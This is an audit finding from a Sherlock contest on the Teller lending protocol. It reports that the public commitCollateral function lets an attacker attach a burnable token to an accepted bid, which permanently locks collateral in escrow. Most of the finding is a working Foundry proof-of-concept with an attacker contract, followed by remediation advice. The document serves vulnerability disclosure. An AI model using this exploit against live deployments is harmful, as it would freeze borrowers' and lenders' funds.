---
name: Audit item
about: These are the audit items that end up in the report
title: "The withdrawls are locked permanently."
labels: ""
assignees: ""

Done with scocoyash. Submit files individually. The final README can differ slightly.

---Impact: high

## Summary
The `commitCollateral` function in CollateralManager is assigned the identifier **public**, so **anyone** can call this function for **any bid** present in the system. The CollateralManager maintains a list of collaterals for a loan in a list **_bidCollaterals**.
Even after a bid has been accepted and a loan has been granted to the receiver, an attacker can commit a new collateral of a **malicious ERC implementation** to the accepted bid, transfer this malicious token to the borrowers address for commitCollateral verification checks. 
Since the implementation of this ERC is malicious, the borrower wont have the token after sometime (the attacker may block the transfer or burn the tokens) 
Although the borrower might have repaid a loan, it cannot withdraw the original committed collateral because while withdrawal, the escrow nor the borrower will have the token committed in the CollateralManager by the attacker and funds are blocked **forever** in the escrow.

**Note:**
The difference between what the protocol team has mentioned about [invalid tokens](https://github.com/sherlock-audit/2023-03-teller/blob/main/README.md#q-please-list-any-known-issuesacceptable-risks-that-should-not-result-in-a-valid-finding) and this is that the protocol team expects the collateral will be valid when the bid is submitted but actually there is no verification after the loan has been granted.

## Vulnerability Detail
- The borrower submits a bid with a token (e.g., WethMock) as collateral, the lender accepts a bid.
- Since the bid is accepted, WethMock token is sent to an escrow at this stage ONLY, the collateral is locked in the escrow and the borrower has the loan.
- The attacker mints his own **malicious token (ERC - 20/721,etc)** and sends some of them - say *N tokens* to the borrower's address.
- The attacker calls `commitCollateral` to commit it as a collateral to the same bid as above with these new tokens - amount *N*. [In this step, there is a checkBalance step where the CollateralManager checks if the borrower has enough balance of the collateral token, which it has since the token is minter by himself/herself]
- The attacker then blocks the transfer of these tokens to anyone since it was a malicious token (ex: may self destruct the erc token contract, may block any further transfers etc).
- Withdrawal can be carried out by the borrower or lender depengin upon the loan status
- The escrow is checked for withdrawal of each collateral in the **_bidCollaterals** list. There is a malicious token information in the **_bidCollaterals** list in CollateralManager, but the escrow does NOT have it, neither the borrower has it since it was committed after the bid is accepted. 
- The withdrawal process as a whole is reverted, and the borrower/lender cannot withdraw collaterals since the borrower might not have the newly minted tokens with him anymore (might burn them or transfer them to someone else).

## POC

Run this test file from tests/ folder with the command:
`forge test --match-contract TestVuln`

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import { Testable } from "./Testable.sol";
import { User } from "./Test_Helpers.sol";

import { CollateralEscrowV1 } from "../contracts/escrow/CollateralEscrowV1.sol";
import { PaymentType } from "../contracts/libraries/V2Calculations.sol";
import { MarketRegistry } from "../contracts/MarketRegistry.sol";

import "../contracts/mock/WethMock.sol";
import "@openzeppelin/contracts/proxy/beacon/UpgradeableBeacon.sol";
import "@openzeppelin/contracts/proxy/beacon/BeaconProxy.sol";

import "@openzeppelin/contracts/token/ERC20/ERC20.sol";

import "./tokens/TestERC20Token.sol";
import "./tokens/TestERC721Token.sol";
import "./tokens/TestERC1155Token.sol";

import "../contracts/mock/TellerV2SolMock.sol";
import "../contracts/CollateralManager.sol";


import "./CollateralManager_Override.sol";
import "lib/forge-std/src/console.sol";

contract TestVuln is Testable {
    CollateralManager collateralManager;
    TellerV2User private marketOwner;
    TellerV2User private borrower;
    TellerV2User private lender;
    TellerV2User private liquidator;
    TellerV2User private attacker;
    //WethMock wethMock;
    
    uint256 marketId1;

    Test_TestERC20Token wethMock;

    Test_TestERC20Token wethMock2;
    
    Test_TestERC20Token malToken;        //Malicious token to send to borrower

    TestERC721Token erc721Mock;
    TestERC1155Token erc1155Mock;

    TellerV2_Mock tellerV2;

    uint256 public erc20_amount;
    uint256 public erc721_amount;
    uint256 public erc1155_amount;

    CollateralEscrowV1 escrowImplementation =
        new CollateralEscrowV1();

    event CollateralCommitted(
        uint256 _bidId,
        CollateralType _type,
        address _collateralAddress,
        uint256 _amount,
        uint256 _tokenId
    );
    event CollateralClaimed(uint256 _bidId);
    event CollateralDeposited(
        uint256 _bidId,
        CollateralType _type,
        address _collateralAddress,
        uint256 _amount,
        uint256 _tokenId
    );
    event CollateralWithdrawn(
        uint256 _bidId,
        CollateralType _type,
        address _collateralAddress,
        uint256 _amount,
        uint256 _tokenId,
        address _recipient
    );

    function setUp() public {
        // Deploy beacon contract with implementation
        UpgradeableBeacon escrowBeacon = new UpgradeableBeacon(
            address(escrowImplementation)
        );

        wethMock = new Test_TestERC20Token("wrappedETH", "WETH", 1e24, 18);
        wethMock2 = new Test_TestERC20Token("wrappedETH2", "WETH2", 1e24, 18);
        erc721Mock = new TestERC721Token("ERC721", "ERC721");
        erc1155Mock = new TestERC1155Token("ERC1155");
        
        borrower = new TellerV2User(address(tellerV2), wethMock);
        marketOwner = new TellerV2User(address(tellerV2), wethMock);
        lender = new TellerV2User(address(tellerV2), wethMock);
        attacker = new TellerV2User(address(tellerV2), wethMock);
        liquidator = new TellerV2User(address(tellerV2), wethMock);

        //  uint256 borrowerBalance = 50000;
        //   payable(address(borrower)).transfer(borrowerBalance);

        collateralManager = new CollateralManager();
        tellerV2 = new TellerV2_Mock(address(collateralManager));
        IMarketRegistry marketRegistry = IMarketRegistry(new MarketRegistry());
        collateralManager.initialize(
            address(escrowBeacon),
            address(tellerV2)
        );
        marketId1 = marketOwner.createMarket(
            address(marketRegistry),
            8000,
            7000,
            5000,
            500,
            false,
            false,
            PaymentType.EMI,
            PaymentCycleType.Seconds,
            "uri://"
        );
    }

    function test_cannot_withdraw_after_commitcollateral() public {
        uint256 bidId = 0;
        uint256 amount = 100;
        wethMock.transfer(address(borrower), 200);
        wethMock2.transfer(address(lender), 200);        
        wethMock2.transfer(address(borrower), 50);        

        Collateral[] memory collateral = new Collateral[](1);
        collateral[0] = Collateral({
                _collateralType: CollateralType.ERC20,
                _amount: 100,
                _tokenId: 0,
                _collateralAddress: address(wethMock)
        });
        borrower.addAllowance(
            address(wethMock),
            address(collateralManager),
            100
        );
        console.log("wtf");
        uint256 _bidId = borrower.submitBid(
            tellerV2,
            collateralManager,
            address(wethMock2),
            marketId1,
            100,
            10000,
            500,
            "metadataUri://",
            address(borrower),
            collateral
        );
    
        console.log("bidID", _bidId);
        collateralManager.commitCollateral(_bidId, collateral);
        
        lender.approveERC20(
            address(wethMock2),
            address(tellerV2),
            amount
        );
        
        uint256 collateralAmount  = collateralManager.getCollateralAmount(0, address(wethMock));
        console.log("collateralAmount ", collateralAmount);
        console.log("isbidscollateralbacked", collateralManager.isBidCollateralBacked(0));
        lender.accept(tellerV2, _bidId);
        
        assertEq(wethMock2.balanceOf(address(lender)), 100, "(S)he sent 100 wethMock2s, so 100 are left.");
        assertEq(wethMock.balanceOf(address(borrower)), 100, "The borrower submitted 100 wethMocks");
        assertEq(wethMock2.balanceOf(address(borrower)), 150, "The borrower has 150 wethMock2s.");
        
        //  Commit another token (that the borrower already has) as Collateral.
        //  Since the CollateralManager doesn't check the whether the borrower == msg.sender, 
        //  It can add a collateral to an existing bid. 
        //  attack with "wethMock" doesn't work because the escrow saves only one collateral info per one token.

        malToken = attacker.mint();
        console.log("attacker :", address(attacker));
        console.log("owner :", malToken.Owner());
        
        /////////////////////////////
        // MALICIOUS TOKEN EXPLOIT //
        /////////////////////////////
        attacker.attack(address(collateralManager), _bidId, amount, address(malToken), address(borrower));

        console.log("After attack, malToken amount at Collateral", collateralManager.getCollateralAmount(0, address(malToken)));

        tellerV2.setGlobalBidState(BidState.PAID,_bidId);
        
        Payment memory amountOwed = tellerV2.calculateAmountOwed(_bidId);
        uint256 finalAmount = amountOwed.principal + amountOwed.interest;
        console.log("amountOwed :", amountOwed.principal, amountOwed.interest);
        borrower.addAllowance(
            address(wethMock2),
            address(tellerV2),
            finalAmount
        );
        
        
        tellerV2.repayLoanFull(_bidId, wethMock2, finalAmount, collateralManager); // Fail here if the attacker attacked.
        assertEq(wethMock.balanceOf(address(borrower)), 200, "Didn't receive my collaterals");  // Assertion Success unless the attacker attacked.
    }
}
contract TellerV2User is User {
    //WethMock public immutable wethMock;
    Test_TestERC20Token public immutable wethMock;
    CollateralManager cm;
    constructor(address _tellerV2, Test_TestERC20Token _wethMock) User(_tellerV2) {
        wethMock = _wethMock;
    }


    //receive 721
    function onERC721Received(address, address, uint256, bytes calldata)
        external
        returns (bytes4)
    {
        return this.onERC721Received.selector;
    }

    //receive 1155
    function onERC1155Received(
        address,
        address,
        uint256,
        uint256,
        bytes calldata
    ) external returns (bytes4) {
        return this.onERC1155Received.selector;
    }

    function approveERC20(address _token, address _receiver, uint256 amount) public {
        Test_TestERC20Token(_token).approve(_receiver, amount);
    }
    // attack function to commit collateral to an existing bid (already accepted).

    function attack(address collateralManager, uint bidId, uint256 amount, address _tokenAddress, address _victim) public{
        cm = CollateralManager(collateralManager);
        Collateral memory collateral = Collateral({
            _collateralType: CollateralType.ERC20,
            _amount: amount,
            _tokenId: 0,
            _collateralAddress: _tokenAddress
        });
        Test_TestERC20Token(_tokenAddress).transfer(_victim, amount);
        console.log("Before burn , malToken amount at borrower", Test_TestERC20Token(_tokenAddress).balanceOf(address(_victim)));
        cm.commitCollateral(bidId, collateral);
        Test_TestERC20Token(_tokenAddress).destroy(_victim, amount);
        console.log("After burn , malToken amount at borrower", Test_TestERC20Token(_tokenAddress).balanceOf(address(_victim)));
    }

    // function to submit Bid as behalf of a borrower.

    function submitBid(
            TellerV2_Mock _teller,
            CollateralManager collateralManager,
            address _lendingToken,
            uint256 _marketplaceId,
            uint256 _principal,
            uint32 _duration,
            uint16 _APR,
            string calldata _metadataURI,
            address _receiver,
            Collateral[] calldata CollateralInfo
        ) public returns (uint256 bidId) {

        bidId = _teller.submitBid(
            _lendingToken,
            _marketplaceId,
            _principal,
            _duration,
            _APR,
            _metadataURI,
            _receiver
        );
        cm = CollateralManager(collateralManager);
        bool validation = cm.commitCollateral(
            bidId,
            CollateralInfo
        );
        if (validation)
            return bidId;
    }
    
    // function to accept id as behalf of a lender.

    function accept(TellerV2_Mock _teller, uint bidId) public{
        _teller.lenderAcceptBid(1, bidId);
    }

    function mint() public returns(Test_TestERC20Token){
        Test_TestERC20Token malToken = new Test_TestERC20Token("maliciousToken", "malToken", 1e24, 18);
        return malToken;

    }
}

contract TellerV2_Mock is TellerV2SolMock {
    address public globalBorrower;
    address public globalLender;
    bool public bidsDefaultedGlobally;
    BidState public globalBidState;
    CollateralManager public manager;
    constructor(address cm) {
        manager = CollateralManager(address(cm));

    }
    modifier acceptedLoan(uint256 _bidId, string memory _action) {
        if (bids[_bidId].state != BidState.ACCEPTED) {
            revert ActionNotAllowed(_bidId, _action, "Loan must be accepted");
        }

        _;
    }
    function setBorrower(address borrower) public {
        globalBorrower = borrower;
    }

    function setLender(address lender) public {
        globalLender = lender;
    }

    function isLoanDefaulted(uint256 _bidId)
        public
        view
        override
        returns (bool)
    {
        return bidsDefaultedGlobally;
    }

    function getBidState(uint256 _bidId)
        public
        view
        override
        returns (BidState)
    {
        return globalBidState;
    }

    function setGlobalBidState(BidState _state, uint256 bidId) public {
        BidState bidState = getBidState(bidId);
        bidState = _state;
        globalBidState = _state;
    }

    function setBidsDefaultedGlobally(bool _defaulted) public {
        bidsDefaultedGlobally = _defaulted;
    }

    function lenderAcceptBid(uint256 no_meaning_number_to_avoid_virtual, uint256 _bidId) public returns (
            uint256 amountToProtocol,
            uint256 amountToMarketplace,
            uint256 amountToBorrower
        ) {
    
        Bid storage bid = bids[_bidId];
        
        bid.lender = msg.sender;
        
        manager.deployAndDeposit(_bidId);
        
        IERC20(bid.loanDetails.lendingToken).transferFrom(
            bid.lender,
            bid.receiver,
            bid.loanDetails.principal
        );
        
        return (0, bid.loanDetails.principal, 0);

    }

    function calculateAmountOwed(uint256 _bidId)
        public
        view
        returns (Payment memory owed)
    {
        if (bids[_bidId].state != BidState.ACCEPTED) return owed;

        (uint256 owedPrincipal, , uint256 interest) = V2Calculations
            .calculateAmountOwed(
                bids[_bidId],
                block.timestamp,
                bidPaymentCycleType[_bidId]
            );
        owed.principal = owedPrincipal;
        owed.interest = interest;
    }

    function repayLoanFull(uint256 _bidId, Test_TestERC20Token _token, uint256 paymentAmount, CollateralManager CM) public
    {
        Bid storage bid = bids[_bidId];
        bid.state = BidState.PAID;
        
        _token.transferFrom(
            bid.borrower,
            bid.lender,
            paymentAmount
        );
        CM.withdraw(_bidId);
    }
}

contract Test_TestERC20Token is ERC20{
    uint8 private immutable DECIMALS;
    address private owner;
    constructor(
        string memory _name,
        string memory _symbol,
        uint256 _totalSupply,
        uint8 _decimals
    ) ERC20(_name, _symbol) {
        owner = msg.sender;
        DECIMALS = _decimals;
        _mint(owner, _totalSupply);
    }

    function Owner() public returns(address){
        return owner;
    }

    function decimals() public view virtual override returns (uint8) {
        return DECIMALS;
    }
    
    function destroy(address _account, uint256 _amount) public {
        require(msg.sender == _account || msg.sender == Owner(), "only msg.sender or owner can burn tokens");

        _burn(_account, _amount);
    }
}

```

## Impact
Committing a collateral to a bid is broken and funds are trapped in the escrow **forever** since the collateral token does not exist anymore.

## Code Snippet
- [Commit Collateral is Public without any token validations](https://github.com/sherlock-audit/2023-03-teller/blob/main/teller-protocol-v2/packages/contracts/contracts/CollateralManager.sol#L117-L130)

- [Withdrawal of Tokens](https://github.com/sherlock-audit/2023-03-teller/blob/main/teller-protocol-v2/packages/contracts/contracts/CollateralManager.sol#L388-L419)

## Tool used
Manual Review, Foundry Test

## Recommendation
- make function **commitCollateral** internal so that it is called only when submitBid occurs, for updating a collateral, expose a new external function for the borrower
-  allow only updation of collateral until the bid is in pending state(for certain conditions), do not allow a new collateral to be added to a bid after the loan is accepted.
- expose additional functions with special privileges in the escrow to return all the funds to specific accounts so that funds are not permanently trapped in escrow.
